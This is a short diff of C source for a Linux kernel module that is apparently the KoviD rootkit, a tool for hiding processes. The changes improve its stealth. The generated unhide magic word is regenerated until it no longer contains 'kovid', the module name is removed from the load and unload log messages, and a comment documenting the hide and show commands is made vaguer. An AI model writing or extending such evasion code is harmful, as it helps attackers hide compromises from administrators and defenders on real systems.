@@ -339,8 +339,23 @@ out_put_kobj:
 
 static char *get_unhide_magic_word(void) {
     static char *magic_word;
-    if(!magic_word)
-        magic_word = kv_util_random_AZ_string(MAX_MAGIC_WORD_SIZE);
+
+    if(!magic_word) {
+        char *m = NULL;
+
+        /** must be pretty unlucky
+         * for this to be forever loop
+         */
+        do {
+            if (m) {
+                kfree(m);
+                m = NULL;
+            }
+            m = kv_util_random_AZ_string(MAX_MAGIC_WORD_SIZE);
+        } while(strstr(m, "kovid"));
+
+        magic_word = m;
+    }
 
     /* magic_word must be freed later */
     return magic_word;
@@ -437,7 +452,8 @@ static int proc_timeout(unsigned int t) {
 }
 
 /**
- * Simple commands: hide, <PID>, show
+ * Current ui
+ * XXX this needs to go
  */
 static ssize_t write_cb(struct file *fptr, const char __user *user,
         size_t size, loff_t *offset) {
@@ -818,7 +834,7 @@ cont:
     op_lock = 1;
 #endif
 
-    prinfo(KERN_INFO "%s loaded.\n", MODNAME);
+    prinfo(KERN_INFO "loaded.\n");
     goto leave;
 
 unroll_init:
@@ -875,7 +891,7 @@ static void __exit kv_cleanup(void) {
 
     fs_names_cleanup();
 
-    prinfo("kovid unloaded.\n");
+    prinfo("unloaded.\n");
 }
 
 module_init(kv_init);
